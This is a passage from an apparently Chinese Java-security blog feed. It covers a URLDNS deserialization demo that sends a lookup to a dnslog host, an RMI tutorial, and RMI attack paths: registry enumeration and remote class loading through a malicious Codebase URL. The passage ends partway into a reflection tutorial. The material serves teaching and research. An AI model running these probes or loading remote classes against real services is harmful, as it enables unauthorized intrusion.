java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoURLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://xxx.dnslog.cn&quot;</span>);</span><br><span class="line">        hashMap.put(u, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> URL.class.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(u, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全漫谈-RMI篇</title>
      <link href="/posts/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87.html"/>
      <url>/posts/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87.html</url>
      
        <content type="html"><![CDATA[<h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><blockquote><p>RMI 的过程，就是用 JRMP 协议去组织数据格式，然后通过 TCP 进行传输，从而达到远程方法调用。</p></blockquote><ul><li><p>RMI（Remote Method Invocation）：远程方法调用。即让一个 JVM 中的对象远程调用另一个 JVM 中的对象的某个方法，简单来说就是跨越 JVM，使用 Java 调用远程 Java 程序</p><ul><li>Server 服务端：提供远程的对象</li><li>Client 客户端：调用远程的对象</li><li>Registry 注册表：存放着远程对象的位置，用于客户端查询所调用的远程方法的引用</li></ul></li><li><p>JRMP（Java Remote Message Protocol）：Java 远程消息交换协议。运行在 TCP&#x2F;IP 之上的线路层协议，该协议要求服务端与客户端都为Java编写。</p><ul><li>Java 本身对 RMI 规范的实现默认使用 JRMP 协议，而在 Weblogic 中使用 T3 协议</li></ul></li><li><p>JNDI（Java Naming and Directory Interface）：Java 命名和目录接口。一组在 Java 应用中访问命名和目录服务的接口，Java 中使用最多的基本就是 RMI 和 LDAP 的目录服务系统，客户端可以通过名称访问对象，并将其下载下来。</p><ul><li>命名服务：将名称和对象联系起来，客户端可以使用名称访问对象</li><li>目录服务：一种命名服务，在命名服务的基础上，增加了属性的概念</li></ul></li></ul><h2 id="RMI-Server"><a href="#RMI-Server" class="headerlink" title="RMI-Server"></a>RMI-Server</h2><p>RMI Server 分为三部分：</p><ul><li>一个远程接口。继承<code>java.rmi.Remote</code>，其中定义要远程调用的函数。</li><li>远程接口的实现类。继承<code>java.rmi.server.UnicastRemoteObject</code>，实现远程调用的函数</li><li>创建实例和<code>Registry</code>注册表，然后在注册表中绑定地址和实例</li></ul><h3 id="定义远程接口"><a href="#定义远程接口" class="headerlink" title="定义远程接口"></a>定义远程接口</h3><p>定义一个远程接口，继承<code>java.rmi.Remote</code>接口，抛出<code>RemoteException</code>异常，修饰符需要为<code>public</code>否则远程调用的时候会报错</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-a2l90qlr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-a2l90qlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h3 id="远程接口实现"><a href="#远程接口实现" class="headerlink" title="远程接口实现"></a>远程接口实现</h3><p>远程接口的实现类，继承<code>java.rmi.server.UnicastRemoteObject</code>，实现远程调用的函数</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-o0fzaclr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-o0fzaclr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IRemoteHelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;RemoteHelloWorld构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Callback&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h3 id="创建实例和注册表"><a href="#创建实例和注册表" class="headerlink" title="创建实例和注册表"></a>创建实例和注册表</h3><p><code>Naming.bind</code>和<code>Naming.rebind</code>的区别：</p><ul><li><code>bind</code>指“绑定”，如果时“绑定”时 Registry 已经存在对应的<code>Name</code>，则系统会抛出错误</li><li><code>rebind</code>指“重绑定”，如果“重绑定”时Registry已经存在对应的<code>Name</code>，则绑定的远程对象将被替换</li><li>除非有特别的业务需求，否则建议使用<code>rebind</code>方法进行绑定</li></ul><p><code>Registry.rebind</code>和<code>Naming.rebind</code>的区别：</p><ul><li><code>Registry.rebind</code>是使用RMI注册表绑定，所以不需要完整RMI URL</li><li><code>Naming.rebind</code>是通过Java的名称服务进行绑定，由于名称服务不止为RMI提供查询服务，所以绑定时需要填入完整RMI URL</li></ul><h4 id="Naming-rebind"><a href="#Naming-rebind" class="headerlink" title="Naming.rebind"></a>Naming.rebind</h4><p>实现 Registry 并将上面的类实例化，然后绑定到指定地址</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-17jx8qlr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-17jx8qlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 实例化远程对象</span></span><br><span class="line">        <span class="type">RemoteHelloWorld</span> <span class="variable">helloObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实现注册表</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将远程对象注册到注册表里面, 绑定地址</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://192.168.111.1:1099/Hello&quot;</span>, helloObject);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果Registry在本地, Host和Port可以省略, 默认 localhost:1099</span></span><br><span class="line">        <span class="comment">//  Naming.rebind(&quot;Hello&quot;, helloObject);</span></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Server runs on port 1099&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h4 id="Registry-rebind"><a href="#Registry-rebind" class="headerlink" title="Registry.rebind"></a>Registry.rebind</h4><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-xq06t1lr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-xq06t1lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建远程对象</span></span><br><span class="line"><span class="type">RemoteHelloWorld</span> <span class="variable">helloObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建注册表</span></span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将远程对象注册到注册表里面,绑定地址</span></span><br><span class="line">registry.rebind(<span class="string">&quot;Hello&quot;</span>, helloObject);</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h2 id="RMI-Client"><a href="#RMI-Client" class="headerlink" title="RMI-Client"></a>RMI-Client</h2><p>编写 RMIClient 并调用远程对象。需要注意的是，如果远程方法有参数，调用方法时所<strong>传入的参数必须是可序列化的</strong>。在传输中是传输序列化后的数据，服务端会对客户端的输入进行反序列化</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-5vxaxslr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-5vxaxslr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException, MalformedURLException &#123;</span><br><span class="line">        <span class="comment">// 查询远程对象</span></span><br><span class="line">        <span class="type">IRemoteHelloWorld</span> <span class="variable">helloObject</span> <span class="operator">=</span> (IRemoteHelloWorld) Naming.lookup(<span class="string">&quot;rmi://192.168.111.1:1099/Hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用远程方法</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> helloObject.hello();</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>Client也有<code>Registry.lookup</code>和<code>Naming.lookup</code>，但它们是一样的</p><h2 id="RMI通信过程"><a href="#RMI通信过程" class="headerlink" title="RMI通信过程"></a>RMI通信过程</h2><blockquote><p>RMI-Server 先在 Registry 上注册一个<code>Name-对象</code>的绑定关系，RMI-Client 通过 <code>Name</code> 向 Registry 发起查询得到这个绑定关系，然后连接到对应的 RMI-Server 并获取到相应对象，<strong>最终在 RMI-Server 上远程调用该对象某个方法</strong></p></blockquote><h3 id="发起RMI通信"><a href="#发起RMI通信" class="headerlink" title="发起RMI通信"></a>发起RMI通信</h3><p>发起一次RMI通信，Server端<code>192.168.111.1</code>，Client端<code>192.168.111.2</code><br><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-0.png" data-caption="Java安全漫谈-RMI篇-0"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-0.png" alt="Java安全漫谈-RMI篇-0"></a></p><p>通信过程中会建立2次 TCP 连接<br><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-1.png" data-caption="Java安全漫谈-RMI篇-1"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-1.png" alt="Java安全漫谈-RMI篇-1"></a></p><p>第1次连接是 Client 和 Registry 的连接，连接到<code>目标IP:1099</code></p><ul><li>Client 发送<code>Call</code>消息：Client 连接 Registry，寻找<code>Name=Hello</code>的对象</li></ul><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-2.png" data-caption="Java安全漫谈-RMI篇-2"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-2.png" alt="Java安全漫谈-RMI篇-2"></a></p><ul><li>Registry响应<code>ReturnData</code>消息：返回<code>Name=Hello</code>对象的序列化数据，并包含对象的IP和端口<ul><li><code>0xACED0005</code>常见的Java反序列化16进制特征。所以这里从<code>\xAC\xED</code>开始就是序列化的数据，IP和端口这只是这个对象的一部分</li></ul></li></ul><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-3.png" data-caption="Java安全漫谈-RMI篇-3"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-3.png" alt="Java安全漫谈-RMI篇-3"></a></p><ul><li>返回的端口位于IP地址后一个字节，这里是<code>\x00\x00\xc4\x55</code>即<code>50261</code>，所以后面 Client 将向 Server 的该端口发起第2次请求<figure class="highlight bash"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-ytzj0zlr592jbb"></i><span>  Bash  </span><div class="collapse show" id="collapse-ytzj0zlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $((<span class="number">16#0000e077</span>))</span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li></ul><p>第2次连接是 Client 和 Server 的连接。Client 向 Server 的目标端口发起请求，并正式调用远程方法</p><h3 id="远程调用报错"><a href="#远程调用报错" class="headerlink" title="远程调用报错"></a>远程调用报错</h3><ul><li>Client和Server的<code>package</code>路径需要一致</li></ul><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-4.png" data-caption="Java安全漫谈-RMI篇-4"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-4.png" alt="Java安全漫谈-RMI篇-4"></a></p><h2 id="RMI的安全问题"><a href="#RMI的安全问题" class="headerlink" title="RMI的安全问题"></a>RMI的安全问题</h2><p>前面是RMI整个的原理与流程，那么RMI会带来哪些安全问题？</p><ul><li>如果我们能访问 RMI Registry 服务，如何对其攻击？</li><li>如果我们控制了目标RMI客户端中<code>Naming.lookup</code>的第一个参数（也就是RMI Registry的地址），能不能进行攻击？</li></ul><h3 id="利用已存在的恶意方法"><a href="#利用已存在的恶意方法" class="headerlink" title="利用已存在的恶意方法"></a>利用已存在的恶意方法</h3><p>这里尝试在<code>192.168.111.2</code>中调用<code>192.168.111.1</code>上的 Registry 进行绑定对象，发现报错如下：<br><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-5.png" data-caption="Java安全漫谈-RMI篇-5"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-5.png" alt="Java安全漫谈-RMI篇-5"></a></p><p>原因是 <strong>Java 对远程访问 RMI Registry 做了限制</strong>，只有来源地址是<code>localhost</code>的时候，才能调用<code>rebind/bind/unbind</code>等方法，但可以远程调用<code>list/lookup</code>方法<br><code>list</code>方法可以列出目标上所有绑定的对象，如果目标服务器上存在一些危险方法，就可以<code>lookup</code>方法对其进行调用，工具 <a href="https://github.com/NickstaDB/BaRMIe">BaRMIe</a> 中一个功能点就是进行危险方法的探测。</p><blockquote><p>官方文档：出于安全原因，应用程序只能绑定或取消绑定到在<strong>同一主机</strong>上运行的注册中心。这样可以防止客户端删除或覆盖服务器的远程注册表中的条目。但是，查找操作是任意主机都可以进行的。</p></blockquote><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-frxv40lr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-frxv40lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoClient2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException, MalformedURLException &#123;</span><br><span class="line">        <span class="comment">// list方法</span></span><br><span class="line">        String[] objs = Naming.list(<span class="string">&quot;rmi://192.168.111.1:1099/&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String obj:objs) &#123;</span><br><span class="line">            System.out.println(obj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-6.png" data-caption="Java安全漫谈-RMI篇-6"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-6.png" alt="Java安全漫谈-RMI篇-6"></a></p><h3 id="利用Codebase"><a href="#利用Codebase" class="headerlink" title="利用Codebase"></a>利用Codebase</h3><p>Codebase 是远程加载类的路径。在 RMI 的流程中，Server 和 Client 之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果在反序列化时发现某个对象，那么就会去自己的<code>CLASSPATH</code>下寻找对应的类；如果在本地没有找到这个类，就会去远程加载 Codebase 中的类。Codebase 参数可以通过如下方式进行设置：</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-orua2mlr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-orua2mlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-Djava.rmi.server.codebase=http:<span class="comment">//xxx.com:8080/</span></span><br><span class="line"> </span><br></pre></td></tr></table></div></figure><p>如果 Codebase 被指定为某个恶意地址，并在该地址放置请求中同名的恶意文件。服务器在接收到这个数据后就会去 CLASSPATH 和指定的 Codebase 寻找类，就很有可能造成危害<br>显然官方也意识到了这一问题，并采取了一些措施：<br>官方在 Java 7u21、6u45 版本中将<code>java.rmi.server.useCodebaseOnly</code>参数的默认值由<code>false</code>改为<code>true</code> 。在<code>true</code>的情况下，Java 虚拟机<strong>只信任预先配置好的 Codebase，不再支持从 RMI 请求中获取。</strong><br>因此只有满足如下条件的 RMI 服务器才能被攻击：</p><ul><li>安装并配置了<code>SecurityManager</code></li><li>配置<code>java.rmi.server.useCodebaseOnly</code>参数为<code>false</code> <figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-8mw1allr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-8mw1allr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li></ul><p>关于 RMI 的攻击手法远不止于此，但进一步扩展需要对CC链有所了解，这里先告一段落，后面填坑，也可以根据参考文章进一步学习。</p><ul><li>参考文章：<ul><li><a href="https://github.com/phith0n/JavaThings">Java安全漫谈</a></li><li><a href="https://xz.aliyun.com/t/7079">基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI</a></li><li><a href="https://www.cnblogs.com/nice0e3/p/13927460.html">Java安全之RMI反序列化</a></li><li><a href="https://blog.csdn.net/qq_38376348/article/details/114767587">RMI Naming.bind和Registry.bind</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全漫谈-反射篇</title>
      <link href="/posts/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E5%8F%8D%E5%B0%84%E7%AF%87.html"/>
      <url>/posts/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E5%8F%8D%E5%B0%84%E7%AF%87.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>Java安全可以从反序列化漏洞开始说起，反序列化漏洞⼜可以从反射开始说起。</p></blockquote><h1 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h1><blockquote><p>可以获取到任何类的构造方法<code>Constructors</code>、成员方法<code>Methods</code>、成员变量<code>Fields</code>等信息</p></blockquote><ul><li>核心方法：基本上这⼏个⽅法包揽了Java安全⾥各种和反射有关的Payload。<ul><li>获取类对象的⽅法： <code>forName</code></li><li>实例化类对象的⽅法： <code>newInstance</code></li><li>获取函数的⽅法： <code>getMethod</code></li><li>执⾏函数的⽅法： <code>invoke</code></li></ul></li></ul><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-gc3l6hlr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-gc3l6hlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">    clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h2 id="Class-forName"><a href="#Class-forName" class="headerlink" title="Class.forName"></a>Class.forName</h2><blockquote><p>通常一个JVM下，只会有一个ClassLoader，而一个ClassLoader下，一种类只会有一个Class对象存在、所以一个JVM中，一种类只会有一个Class对象存在。</p></blockquote><p><a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Class.html#forName%28java.lang.String%29">Class.forName()</a>，有两个函数重载，其中方法1可以理解为方法2的封装：</p><ul><li><code>Class&lt;?&gt; forName(String name)</code></li><li><code>Class&lt;?&gt; forName(String name, boolean initialize,ClassLoader loader)</code><ul><li><code>name</code>：类名，即类完整路径，如<code>java.lang.Runtime</code>，</li><li><code>initialize</code>：是否初始化</li><li><code>ClassLoader</code>：类加载器，Java默认的ClassLoader就是根据类名来加载类</li></ul></li></ul><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-m44ht0lr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-m44ht0lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(className);</span><br><span class="line"><span class="comment">// 等于</span></span><br><span class="line">Class.forName(className, <span class="literal">true</span>, currentLoader);</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h3 id="参数initialize"><a href="#参数initialize" class="headerlink" title="参数initialize"></a>参数initialize</h3><p>先来看一段代码，分别通过2种方式运行：类初始化<code>forName</code>、类实例化<code>new</code></p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-vb4u0alr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-vb4u0alr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainPrint</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Empty block initial %s\n&quot;</span>, <span 